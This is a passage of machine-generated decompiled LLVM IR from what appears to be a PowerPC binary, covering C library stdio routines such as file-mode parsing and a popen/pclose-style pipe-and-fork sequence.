  store i32 268455592, i32* @lr, align 4
  %v1_10004ea4 = call i32 @function_10004ab4(i32 %v3_10004ea0)
  %v3_10004ea8 = icmp eq i32 %v1_10004ea4, 0
  store i1 %v3_10004ea8, i1* %cr7_eq.global-to-local, align 1
  %tmp8 = icmp sgt i32 %v1_10004ea4, -1
  br i1 %tmp8, label %dec_label_pc_10004eb4, label %dec_label_pc_10004eb0

dec_label_pc_10004eb0:                            ; preds = %dec_label_pc_10004ea0
  store i32 -1, i32* @r27, align 4
  br label %dec_label_pc_10004eb4

dec_label_pc_10004eb4:                            ; preds = %dec_label_pc_10004ea0, %dec_label_pc_10004eb0
  %v1_10004ebc = load i32, i32* @r31, align 4
  %v2_10004ebc = add i32 %v1_10004ebc, 4
  %v3_10004ebc = inttoptr i32 %v2_10004ebc to i32*
  store i32 -1, i32* %v3_10004ebc, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_100091f4.205 to i32), i32* @r26, align 4
  %v2_10004ec8 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_10004ec8, i32* @r30, align 4
  store i32 ptrtoint (i32* @global_var_100100fc.206 to i32), i32* @r29, align 4
  store i32 %v2_10004ec8, i32* @r3, align 4
  %v0_10004edc = call i32 @function_100091fc()
  %v0_10004ee4 = call i32 @function_100091f4()
  %v3_10004eec = load i32, i32* @global_var_10010494.207, align 4
  store i32 %v2_10004ec8, i32* @r3, align 4
  %v1_10004ef8 = add i32 %v3_10004eec, 1
  store i32 %v1_10004ef8, i32* @global_var_10010494.207, align 4
  %v0_10004f00 = call i32 @function_100091fc()
  %v0_10004f04 = load i32, i32* @r31, align 4
  %v1_10004f04 = inttoptr i32 %v0_10004f04 to i16*
  %v2_10004f04 = load i16, i16* %v1_10004f04, align 2
  %v3_10004f04 = zext i16 %v2_10004f04 to i32
  %v0_10004f08 = load i32, i32* @r28, align 4
  %v3_10004f08 = icmp eq i32 %v0_10004f08, 0
  store i1 %v3_10004f08, i1* %cr7_eq.global-to-local, align 1
  %v1_10004f0c = call i32 @__asm_rlwinm(i32 %v3_10004f04, i32 0, i32 17, i32 18)
  %v1_10004f14 = or i32 %v1_10004f0c, 48
  %v1_10004f18 = trunc i32 %v1_10004f14 to i16
  %v2_10004f18 = load i32, i32* @r31, align 4
  %v3_10004f18 = inttoptr i32 %v2_10004f18 to i16*
  store i16 %v1_10004f18, i16* %v3_10004f18, align 2
  %v0_10004f1c = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10004f1c, label %dec_label_pc_10004f20, label %dec_label_pc_10004f2c

dec_label_pc_10004f20:                            ; preds = %dec_label_pc_10004eb4
  %v2_10004f20 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_10004f20, i32* @r3, align 4
  %v0_10004f28 = call i32 @function_100091fc()
  br label %dec_label_pc_10004f2c

dec_label_pc_10004f2c:                            ; preds = %dec_label_pc_10004eb4, %dec_label_pc_10004f20
  %v0_10004f2c = load i32, i32* @r31, align 4
  %v1_10004f2c = inttoptr i32 %v0_10004f2c to i16*
  %v2_10004f2c = load i16, i16* %v1_10004f2c, align 2
  %v1_10004f30 = and i16 %v2_10004f2c, 16384
  %v3_10004f30 = icmp eq i16 %v1_10004f30, 0
  br i1 %v3_10004f30, label %dec_label_pc_10004f40, label %dec_label_pc_10004f38

dec_label_pc_10004f38:                            ; preds = %dec_label_pc_10004f2c
  %v1_10004f38 = add i32 %v0_10004f2c, 8
  %v2_10004f38 = inttoptr i32 %v1_10004f38 to i32*
  %v3_10004f38 = load i32, i32* %v2_10004f38, align 4
  store i32 %v3_10004f38, i32* @r3, align 4
  store i32 268455744, i32* @lr, align 4
  %v0_10004f3c = call i32 @function_100081f4()
  br label %dec_label_pc_10004f40

dec_label_pc_10004f40:                            ; preds = %dec_label_pc_10004f2c, %dec_label_pc_10004f38
  store i32 %v2_10004ec8, i32* @r3, align 4
  %v0_10004f4c = call i32 @function_100091fc()
  %v0_10004f54 = call i32 @function_100091f4()
  %v3_10004f5c = load i32, i32* @global_var_10010498.208, align 4
  store i32 %v2_10004ec8, i32* @r3, align 4
  %v1_10004f68 = add i32 %v3_10004f5c, 1
  store i32 %v1_10004f68, i32* @global_var_10010498.208, align 4
  %v0_10004f70 = call i32 @function_100091fc()
  store i32 268455800, i32* @lr, align 4
  %v0_10004f74 = call i32 @function_10006b38()
  %v0_10004f7c = load i32, i32* @r27, align 4
  ret i32 %v0_10004f7c

; uselistorder directives
  uselistorder i32 %tmp, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10004f40, { 1, 0 }
  uselistorder label %dec_label_pc_10004f2c, { 1, 0 }
  uselistorder label %dec_label_pc_10004eb4, { 1, 0 }
  uselistorder label %dec_label_pc_10004ea0, { 1, 0 }
  uselistorder label %dec_label_pc_10004e84, { 1, 0 }
}

define i32 @function_10004f90(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10004f90:
  store i32 0, i32* @r5, align 4
  store i32 -1, i32* @r6, align 4
  %v3_10004f98 = call i32 @function_10005434(i32 0, i8* inttoptr (i32 -1 to i8*))
  ret i32 %v3_10004f98
}

define i32 @function_10004f9c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10004f9c:
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 -1, i32* @r4, align 4
  %v0_10004fa8 = call i32 @function_10005038()
  ret i32 %v0_10004fa8
}

define i32 @function_10004fac(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10004fac:
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  store i32 -1, i32* @r4, align 4
  store i32 %arg1, i32* @r5, align 4
  %v2_10004fcc = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_10004fcc, i32* @r6, align 4
  store i32 2, i32* %stack_var_-104, align 4
  %v2_1000501c = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_1000501c, i32* %stack_var_-96, align 4
  store i32 268455976, i32* @lr, align 4
  %v0_10005024 = call i32 @function_10005038()
  ret i32 %v0_10005024
}

define i32 @function_10005038() local_unnamed_addr {
dec_label_pc_10005038:
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  store i32 208, i32* %stack_var_-104, align 4
  %v0_1000505c = load i32, i32* @r4, align 4
  store i32 %v0_1000505c, i32* @r27, align 4
  %v0_10005060 = load i32, i32* @r3, align 4
  %v1_10005060 = sub i32 -1, %v0_10005060
  store i32 %v1_10005060, i32* %r30.global-to-local, align 4
  store i32 0, i32* @r26, align 4
  store i32 %v0_10005060, i32* %r31.global-to-local, align 4
  %v2_10005074 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_10005074, i32* @r3, align 4
  %v0_10005078 = load i32, i32* @r5, align 4
  store i32 %v0_10005078, i32* %r29.global-to-local, align 4
  %v0_1000507c = load i32, i32* @r6, align 4
  store i32 %v0_1000507c, i32* @r28, align 4
  store i32 268456076, i32* @lr, align 4
  %v0_10005088 = call i32 @function_10005768()
  %v0_1000508c = load i32, i32* %r30.global-to-local, align 4
  %v1_1000508c = load i32, i32* @r27, align 4
  %v3_1000508c = icmp ugt i32 %v0_1000508c, %v1_1000508c
  %v0_10005090 = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_10005090, i32* @r4, align 4
  %v0_10005094 = load i32, i32* @r28, align 4
  store i32 %v0_10005094, i32* @r5, align 4
  %v2_10005098 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_10005098, i32* @r3, align 4
  br i1 %v3_1000508c, label %dec_label_pc_100050a4, label %dec_label_pc_100050a8

dec_label_pc_100050a4:                            ; preds = %dec_label_pc_10005038
  store i32 %v1_1000508c, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_100050a8

dec_label_pc_100050a8:                            ; preds = %dec_label_pc_10005038, %dec_label_pc_100050a4
  %v1_100050a8 = phi i32 [ %v0_1000508c, %dec_label_pc_10005038 ], [ %v1_1000508c, %dec_label_pc_100050a4 ]
  %v0_100050a8 = load i32, i32* %r31.global-to-local, align 4
  store i32 268456136, i32* @lr, align 4
  %v0_100050c4 = call i32 @function_10005988()
  %v0_100050c8 = load i32, i32* @r30, align 4
  %v3_100050c8 = icmp eq i32 %v0_100050c8, 0
  br i1 %v3_100050c8, label %dec_label_pc_100050f0, label %dec_label_pc_100050d0

dec_label_pc_100050d0:                            ; preds = %dec_label_pc_100050a8
  %v4_100050dc = icmp eq i32 %v1_100050a8, 0
  %v1_100050d8 = sext i1 %v4_100050dc to i32
  %v0_100050e4.v0_100050a8 = add i32 %v0_100050a8, %v1_100050d8
  %stack_var_-88.0 = inttoptr i32 %v0_100050e4.v0_100050a8 to i8*
  %v0_100050ec = load i32, i32* @r26, align 4
  %v1_100050ec = trunc i32 %v0_100050ec to i8
  store i8 %v1_100050ec, i8* %stack_var_-88.0, align 1
  br label %dec_label_pc_100050f0

dec_label_pc_100050f0:                            ; preds = %dec_label_pc_100050a8, %dec_label_pc_100050d0
  ret i32 %v0_100050c4

; uselistorder directives
  uselistorder i32 %v0_10005060, { 1, 0 }
  uselistorder i32* %stack_var_-104, { 1, 0 }
  uselistorder label %dec_label_pc_100050f0, { 1, 0 }
  uselistorder label %dec_label_pc_100050a8, { 1, 0 }
}

define i32 @function_10005104(i32 %arg1) local_unnamed_addr {
dec_label_pc_10005104:
  %r29.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_100108fc.210 to i32), i32* %r29.global-to-local, align 4
  store i32 %arg1, i32* @r31, align 4
  %v2_10005128 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_10005128, i32* @r3, align 4
  %v0_10005130 = call i32 @function_100091fc()
  %v0_10005138 = call i32 @function_100091f4()
  %v3_10005140 = load i32, i32* @global_var_10010490.211, align 4
  store i32 %v3_10005140, i32* %r29.global-to-local, align 4
  %v3_10005144 = icmp eq i32 %v3_10005140, 0
  br i1 %v3_10005144, label %dec_label_pc_100051a0, label %dec_label_pc_1000514c

dec_label_pc_1000514c:                            ; preds = %dec_label_pc_10005104
  %v1_1000514c = add i32 %v3_10005140, 4
  %v2_1000514c = inttoptr i32 %v1_1000514c to i32*
  %v3_1000514c = load i32, i32* %v2_1000514c, align 4
  %v1_10005150 = load i32, i32* @r31, align 4
  %v4_10005150 = icmp eq i32 %v3_1000514c, %v1_10005150
  br i1 %v4_10005150, label %dec_label_pc_10005158, label %dec_label_pc_1000517c

dec_label_pc_10005158:                            ; preds = %dec_label_pc_1000514c
  %v1_10005158 = inttoptr i32 %v3_10005140 to i32*
  %v2_10005158 = load i32, i32* %v1_10005158, align 4
  store i32 %v2_10005158, i32* @global_var_10010490.211, align 4
  br label %dec_label_pc_100051a0

dec_label_pc_10005164:                            ; preds = %dec_label_pc_1000517c
  %v0_10005164 = call i32 @function_10004e38()
  %v2_1000516c = inttoptr i32 %v0_10005164 to i32*
  store i32 22, i32* %v2_1000516c, align 4
  br label %dec_label_pc_100051a0

dec_label_pc_10005174:                            ; preds = %dec_label_pc_100051c8
  %v3_10005174 = load i32, i32* %stack_var_-56, align 4
  br label %dec_label_pc_100051f4

dec_label_pc_1000517c:                            ; preds = %dec_label_pc_1000514c, %dec_label_pc_1000518c
  %v1_1000519c = phi i32 [ %v2_10005180, %dec_label_pc_1000518c ], [ %v3_10005140, %dec_label_pc_1000514c ]
  %v1_10005180 = inttoptr i32 %v1_1000519c to i32*
  %v2_10005180 = load i32, i32* %v1_10005180, align 4
  store i32 %v2_10005180, i32* %r29.global-to-local, align 4
  %v3_10005184 = icmp eq i32 %v2_10005180, 0
  br i1 %v3_10005184, label %dec_label_pc_10005164, label %dec_label_pc_1000518c

dec_label_pc_1000518c:                            ; preds = %dec_label_pc_1000517c
  %v1_1000518c = add i32 %v2_10005180, 4
  %v2_1000518c = inttoptr i32 %v1_1000518c to i32*
  %v3_1000518c = load i32, i32* %v2_1000518c, align 4
  %v4_10005190 = icmp eq i32 %v3_1000518c, %v1_10005150
  br i1 %v4_10005190, label %dec_label_pc_10005198, label %dec_label_pc_1000517c

dec_label_pc_10005198:                            ; preds = %dec_label_pc_1000518c
  %v1_10005198 = inttoptr i32 %v2_10005180 to i32*
  %v2_10005198 = load i32, i32* %v1_10005198, align 4
  store i32 %v2_10005198, i32* %v1_10005180, align 4
  br label %dec_label_pc_100051a0

dec_label_pc_100051a0:                            ; preds = %dec_label_pc_10005104, %dec_label_pc_10005164, %dec_label_pc_10005158, %dec_label_pc_10005198
  store i32 %v2_10005128, i32* @r3, align 4
  %v0_100051a8 = call i32 @function_100091fc()
  %v0_100051ac = load i32, i32* %r29.global-to-local, align 4
  %v3_100051ac = icmp eq i32 %v0_100051ac, 0
  br i1 %v3_100051ac, label %dec_label_pc_100051f4, label %dec_label_pc_100051b4

dec_label_pc_100051b4:                            ; preds = %dec_label_pc_100051a0
  store i32 %v0_100051ac, i32* @r3, align 4
  %v1_100051b8 = add i32 %v0_100051ac, 8
  %v2_100051b8 = inttoptr i32 %v1_100051b8 to i32*
  %v3_100051b8 = load i32, i32* %v2_100051b8, align 4
  store i32 %v3_100051b8, i32* %r29.global-to-local, align 4
  store i32 268456384, i32* @lr, align 4
  %v0_100051bc = call i32 @function_100081f4()
  %v0_100051c0 = load i32, i32* @r31, align 4
  store i32 268456392, i32* @lr, align 4
  %v1_100051c4 = inttoptr i32 %v0_100051c0 to i16*
  %v2_100051c4 = call i32 @function_10004e44(i16* %v1_100051c4)
  %v2_100051c8 = ptrtoint i32* %stack_var_-56 to i32
  br label %dec_label_pc_100051c8

dec_label_pc_100051c8:                            ; preds = %dec_label_pc_100051e0, %dec_label_pc_100051b4
  %v0_100051d0 = load i32, i32* @r29, align 4
  store i32 268456408, i32* @lr, align 4
  %v3_100051d4 = call i32 @function_10004dc8(i32 %v0_100051d0, i32 %v2_100051c8, i32 0)
  %tmp8 = icmp sgt i32 %v3_100051d4, -1
  br i1 %tmp8, label %dec_label_pc_10005174, label %dec_label_pc_100051e0

dec_label_pc_100051e0:                            ; preds = %dec_label_pc_100051c8
  %v0_100051e0 = call i32 @function_10004e38()
  %v1_100051e4 = inttoptr i32 %v0_100051e0 to i32*
  %v2_100051e4 = load i32, i32* %v1_100051e4, align 4
  %v3_100051e8 = icmp eq i32 %v2_100051e4, 4
  br i1 %v3_100051e8, label %dec_label_pc_100051c8, label %dec_label_pc_100051f4

dec_label_pc_100051f4:                            ; preds = %dec_label_pc_100051e0, %dec_label_pc_100051a0, %dec_label_pc_10005174
  %storemerge = phi i32 [ %v3_10005174, %dec_label_pc_10005174 ], [ -1, %dec_label_pc_100051a0 ], [ -1, %dec_label_pc_100051e0 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_100051ac, { 1, 0, 2 }
  uselistorder i32 %v2_10005180, { 0, 2, 3, 4, 1 }
  uselistorder i32* %stack_var_-56, { 1, 0 }
  uselistorder i32* %r29.global-to-local, { 0, 2, 1, 3, 4 }
  uselistorder label %dec_label_pc_100051a0, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_1000517c, { 1, 0 }
}

define i32 @function_10005208(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10005208:
  %r11.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %v3_1000521c = load i8, i8* %arg2, align 1
  %v3_10005224 = icmp eq i8 %v3_1000521c, 119
  br i1 %v3_10005224, label %dec_label_pc_10005254, label %dec_label_pc_1000522c

dec_label_pc_1000522c:                            ; preds = %dec_label_pc_10005208
  %v3_1000522c = icmp eq i8 %v3_1000521c, 114
  br i1 %v3_1000522c, label %dec_label_pc_1000525c, label %dec_label_pc_1000523c

dec_label_pc_1000523c:                            ; preds = %dec_label_pc_1000522c
  %v0_1000523c = call i32 @function_10004e38()
  %v2_1000524c = inttoptr i32 %v0_1000523c to i32*
  store i32 22, i32* %v2_1000524c, align 4
  br label %dec_label_pc_1000541c

dec_label_pc_10005254:                            ; preds = %dec_label_pc_10005208
  store i32 0, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000525c

dec_label_pc_1000525c:                            ; preds = %dec_label_pc_1000522c, %dec_label_pc_10005254
  %v0_10005324 = phi i32 [ 0, %dec_label_pc_10005254 ], [ 1, %dec_label_pc_1000522c ]
  store i32 12, i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10005264.214 to i32), i32* @lr, align 4
  %v0_10005260 = call i32 @function_1000809c()
  store i32 0, i32* %r11.global-to-local, align 4
  store i32 %v0_10005260, i32* %r9.global-to-local, align 4
  %v3_10005268 = icmp eq i32 %v0_10005260, 0
  br i1 %v3_10005268, label %dec_label_pc_1000541c, label %dec_label_pc_10005278

dec_label_pc_10005278:                            ; preds = %dec_label_pc_1000525c
  %v2_10005278 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_10005278, i32* %r29.global-to-local, align 4
  store i32 268456580, i32* @lr, align 4
  %v2_10005280 = call i32 @function_10009948(i32 %v2_10005278, i32 %v0_10005260)
  %v3_10005284 = icmp eq i32 %v2_10005280, 0
  br i1 %v3_10005284, label %dec_label_pc_1000528c, label %dec_label_pc_1000540c

dec_label_pc_1000528c:                            ; preds = %dec_label_pc_10005278
  store i32 %v0_10005324, i32* %r9.global-to-local, align 4
  %v0_10005290 = load i32, i32* @r31, align 4
  %tmp = sub nsw i32 0, %v0_10005324
  %v1_10005294 = and i32 %tmp, 4
  %v1_10005298 = xor i32 %v1_10005294, 4
  %v0_1000529c = load i32, i32* %r29.global-to-local, align 4
  %v2_1000529c = add i32 %v0_1000529c, %v1_10005298
  %v3_1000529c = inttoptr i32 %v2_1000529c to i32*
  %v4_1000529c = load i32, i32* %v3_1000529c, align 4
  %v2_100052a8 = add i32 %v0_1000529c, %v1_10005294
  %v3_100052a8 = inttoptr i32 %v2_100052a8 to i32*
  %v4_100052a8 = load i32, i32* %v3_100052a8, align 4
  store i32 268456632, i32* @lr, align 4
  %v4_100052b4 = call i32 @function_10009c0c(i32 %v4_1000529c, i32 %v0_10005290, i32 %v0_10005324)
  %v3_100052b8 = icmp eq i32 %v4_100052b4, 0
  store i1 false, i1* @cr0_so, align 1
  br i1 %v3_100052b8, label %dec_label_pc_100052c4, label %dec_label_pc_100052d8

dec_label_pc_100052c4:                            ; preds = %dec_label_pc_1000528c
  store i32 268456652, i32* @lr, align 4
  %v1_100052c8 = call i32 @function_10004ab4(i32 %v4_1000529c)
  store i32 ptrtoint (i32* @global_var_100052d4.215 to i32), i32* @lr, align 4
  %v1_100052d0 = call i32 @function_10004ab4(i32 %v4_100052a8)
  br label %dec_label_pc_1000540c

dec_label_pc_100052d8:                            ; preds = %dec_label_pc_1000528c
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r9.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_100108fc.210 to i32), i32* %r29.global-to-local, align 4
  %v2_100052ec = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v2_100052ec, i32* @r3, align 4
  %v0_100052f0 = call i32 @function_100091fc()
  %v0_100052f8 = call i32 @function_100091f4()
  store i32 %v0_100052f8, i32* @r3, align 4
  store i32 268456704, i32* @lr, align 4
  %v1_100052fc = call i32 @function_1000954c(i32 %v0_100052f8)
  store i32 %v1_100052fc, i32* @r31, align 4
  %v3_10005300 = icmp eq i32 %v1_100052fc, 0
  %v0_10005304 = call i32 @__asm_mfcr()
  store i32 %v0_10005304, i32* %r29.global-to-local, align 4
  br i1 %v3_10005300, label %dec_label_pc_1000530c, label %dec_label_pc_1000538c

dec_label_pc_1000530c:                            ; preds = %dec_label_pc_100052d8
  store i32 268456724, i32* @lr, align 4
  %v1_10005310 = call i32 @function_10004ab4(i32 %v4_1000529c)
  store i32 %v0_10005324, i32* %r9.global-to-local, align 4
  %v4_1000531c = icmp eq i32 %v4_100052a8, %v0_10005324
  br i1 %v4_1000531c, label %dec_label_pc_10005338, label %dec_label_pc_10005324

dec_label_pc_10005324:                            ; preds = %dec_label_pc_1000530c
  store i32 268456752, i32* @lr, align 4
  %v2_1000532c = call i32 @function_100096c8(i32 %v4_100052a8, i32 %v0_10005324)
  store i32 268456760, i32* @lr, align 4
  %v1_10005334 = call i32 @function_10004ab4(i32 %v4_100052a8)
  br label %dec_label_pc_10005338

dec_label_pc_10005338:                            ; preds = %dec_label_pc_1000530c, %dec_label_pc_10005324
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r9.global-to-local, align 4
  %storemerge1 = load i32, i32* @global_var_10010490.211, align 4
  store i32 %storemerge1, i32* %r29.global-to-local, align 4
  %v3_100053544 = icmp eq i32 %storemerge1, 0
  br i1 %v3_100053544, label %dec_label_pc_1000535c, label %dec_label_pc_10005344

dec_label_pc_10005344:                            ; preds = %dec_label_pc_10005338, %dec_label_pc_10005344
  %v0_10005344 = phi i32 [ %storemerge, %dec_label_pc_10005344 ], [ %storemerge1, %dec_label_pc_10005338 ]
  %v1_10005344 = add i32 %v0_10005344, 4
  %v2_10005344 = inttoptr i32 %v1_10005344 to i32*
  %v3_10005344 = load i32, i32* %v2_10005344, align 4
  store i32 %v3_10005344, i32* %r9.global-to-local, align 4
  %v1_10005348 = add i32 %v3_10005344, 4
  %v2_10005348 = inttoptr i32 %v1_10005348 to i32*
  %v3_10005348 = load i32, i32* %v2_10005348, align 4
  store i32 268456784, i32* @lr, align 4
  %v1_1000534c = call i32 @function_10004ab4(i32 %v3_10005348)
  %v0_10005350 = load i32, i32* %r29.global-to-local, align 4
  %v1_10005350 = inttoptr i32 %v0_10005350 to i32*
  %storemerge = load i32, i32* %v1_10005350, align 4
  store i32 %storemerge, i32* %r29.global-to-local, align 4
  %v3_10005354 = icmp eq i32 %storemerge, 0
  br i1 %v3_10005354, label %dec_label_pc_1000535c, label %dec_label_pc_10005344

dec_label_pc_1000535c:                            ; preds = %dec_label_pc_10005344, %dec_label_pc_10005338
  %v8_10005380 = call i32 @function_10008e58(i32 ptrtoint ([8 x i8]* @global_var_1000e5a4.218 to i32), i32 ptrtoint ([3 x i8]* @global_var_1000e5ac.219 to i32), i32 ptrtoint ([3 x i8]* @global_var_1000e5b0.220 to i32), i32 %arg1, i32 0)
  %v1_10005388 = call i32 @function_1000968c(i32 127)
  br label %dec_label_pc_1000538c

dec_label_pc_1000538c:                            ; preds = %dec_label_pc_100052d8, %dec_label_pc_1000535c
  store i32 %v2_100052ec, i32* @r3, align 4
  %v0_10005398 = call i32 @function_100091fc()
  store i32 268456868, i32* @lr, align 4
  %v1_100053a0 = call i32 @function_10004ab4(i32 %v4_100052a8)
  %v0_100053a4 = load i32, i32* %r29.global-to-local, align 4
  %v1_100053a4 = call %0 @__asm_mtcrf(i32 128, i32 %v0_100053a4)
  %v2_100053a4 = extractvalue %0 %v1_100053a4, 0
  %v4_100053a4 = extractvalue %0 %v1_100053a4, 2
  %v2_100053a8 = or i1 %v4_100053a4, %v2_100053a4
  br i1 %v2_100053a8, label %dec_label_pc_10005404, label %dec_label_pc_100053ac

dec_label_pc_100053ac:                            ; preds = %dec_label_pc_1000538c
  store i32 %v0_10005260, i32* %r9.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_100108fc.210 to i32), i32* %r29.global-to-local, align 4
  store i32 %v2_100052ec, i32* @r3, align 4
  %v0_100053c0 = load i32, i32* @r31, align 4
  %v2_100053c0 = add i32 %v0_10005260, 8
  %v3_100053c0 = inttoptr i32 %v2_100053c0 to i32*
  store i32 %v0_100053c0, i32* %v3_100053c0, align 4
  store i32 %v4_100052b4, i32* %r11.global-to-local, align 4
  %v1_100053c8 = load i32, i32* %r9.global-to-local, align 4
  %v2_100053c8 = add i32 %v1_100053c8, 4
  %v3_100053c8 = inttoptr i32 %v2_100053c8 to i32*
  store i32 %v4_100052b4, i32* %v3_100053c8, align 4
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r9.global-to-local, align 4
  %v0_100053d4 = call i32 @function_100091fc()
  %v0_100053dc = call i32 @function_100091f4()
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r9.global-to-local, align 4
  %v3_100053e4 = load i32, i32* @global_var_10010490.211, align 4
  store i32 %v2_100052ec, i32* @r3, align 4
  store i32 %v0_10005260, i32* %r11.global-to-local, align 4
  %v2_100053f4 = inttoptr i32 %v0_10005260 to i32*
  store i32 %v3_100053e4, i32* %v2_100053f4, align 4
  %v0_100053f8 = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_100053f8, i32* @global_var_10010490.211, align 4
  %v0_100053fc = call i32 @function_100091fc()
  br label %dec_label_pc_1000541c

dec_label_pc_10005404:                            ; preds = %dec_label_pc_1000538c
  store i32 268456972, i32* @lr, align 4
  %v1_10005408 = inttoptr i32 %v4_100052b4 to i16*
  %v2_10005408 = call i32 @function_10004e44(i16* %v1_10005408)
  br label %dec_label_pc_1000540c

dec_label_pc_1000540c:                            ; preds = %dec_label_pc_10005278, %dec_label_pc_100052c4, %dec_label_pc_10005404
  store i32 %v0_10005260, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_10005414.223 to i32), i32* @lr, align 4
  %v0_10005410 = call i32 @function_100081f4()
  br label %dec_label_pc_1000541c

dec_label_pc_1000541c:                            ; preds = %dec_label_pc_1000525c, %dec_label_pc_100053ac, %dec_label_pc_1000523c, %dec_label_pc_1000540c
  %stack_var_-24.0 = phi i32 [ 0, %dec_label_pc_1000525c ], [ 0, %dec_label_pc_1000540c ], [ %v4_100052b4, %dec_label_pc_100053ac ], [ 0, %dec_label_pc_1000523c ]
  ret i32 %stack_var_-24.0

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v4_100052b4, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v4_100052a8, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_10005260, { 4, 1, 0, 3, 2, 5, 6, 7 }
  uselistorder i32 %v0_10005324, { 1, 3, 2, 5, 0, 4 }
  uselistorder i32* %r29.global-to-local, { 0, 2, 1, 7, 8, 3, 4, 5, 6 }
  uselistorder i32* @global_var_10010490.211, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_1000541c, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_1000540c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000538c, { 1, 0 }
  uselistorder label %dec_label_pc_10005344, { 1, 0 }
  uselistorder label %dec_label_pc_10005338, { 1, 0 }
  uselistorder label %dec_label_pc_1000525c, { 1, 0 }
}

define i32 @function_10005434(i32 %arg1, i8* %arg2) local_unnamed_addr {
dec_label_pc_10005434:
  %r0.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v0_10005438 = load i32, i32* @lr, align 4
  store i32 %v0_10005438, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* @r27, align 4
  %v0_10005448 = load i32, i32* @r5, align 4
  store i32 %v0_10005448, i32* @r31, align 4
  %v0_1000544c = load i32, i32* @r6, align 4
  store i32 %v0_1000544c, i32* @r29, align 4
  %v3_10005450 = load i8, i8* %arg2, align 1
  %v4_10005450 = zext i8 %v3_10005450 to i32
  store i32 %v4_10005450, i32* %r0.global-to-local, align 4
  %v3_10005454 = icmp eq i8 %v3_10005450, 114
  br i1 %v3_10005454, label %dec_label_pc_100054a0, label %dec_label_pc_1000545c

dec_label_pc_1000545c:                            ; preds = %dec_label_pc_10005434
  %v3_1000545c = icmp eq i8 %v3_10005450, 119
  store i32 577, i32* @r28, align 4
  br i1 %v3_1000545c, label %dec_label_pc_100054a4, label %dec_label_pc_10005468

dec_label_pc_10005468:                            ; preds = %dec_label_pc_1000545c
  %v3_10005468 = icmp eq i8 %v3_10005450, 97
  store i32 1089, i32* @r28, align 4
  br i1 %v3_10005468, label %dec_label_pc_100054a4, label %dec_label_pc_10005474

dec_label_pc_10005474:                            ; preds = %dec_label_pc_10005534, %dec_label_pc_10005504, %dec_label_pc_10005468
  %v0_10005474 = call i32 @function_10004e38()
  store i32 22, i32* %r0.global-to-local, align 4
  %v0_1000547c = load i32, i32* @r31, align 4
  %v3_1000547c = icmp eq i32 %v0_1000547c, 0
  %v2_10005480 = inttoptr i32 %v0_10005474 to i32*
  store i32 22, i32* %v2_10005480, align 4
  br i1 %v3_1000547c, label %dec_label_pc_100056d8, label %dec_label_pc_10005488

dec_label_pc_10005488:                            ; preds = %dec_label_pc_10005568, %dec_label_pc_10005474
  %v0_10005488 = load i32, i32* @r31, align 4
  %v1_10005488 = inttoptr i32 %v0_10005488 to i16*
  %v2_10005488 = load i16, i16* %v1_10005488, align 2
  %v3_10005488 = zext i16 %v2_10005488 to i32
  store i32 %v3_10005488, i32* %r0.global-to-local, align 4
  %v1_1000548c = and i32 %v3_10005488, 8192
  store i32 %v1_1000548c, i32* %r9.global-to-local, align 4
  %v3_1000548c = icmp eq i32 %v1_1000548c, 0
  br i1 %v3_1000548c, label %dec_label_pc_100056d8, label %dec_label_pc_10005494

dec_label_pc_10005494:                            ; preds = %dec_label_pc_10005488
  store i32 %v0_10005488, i32* @r3, align 4
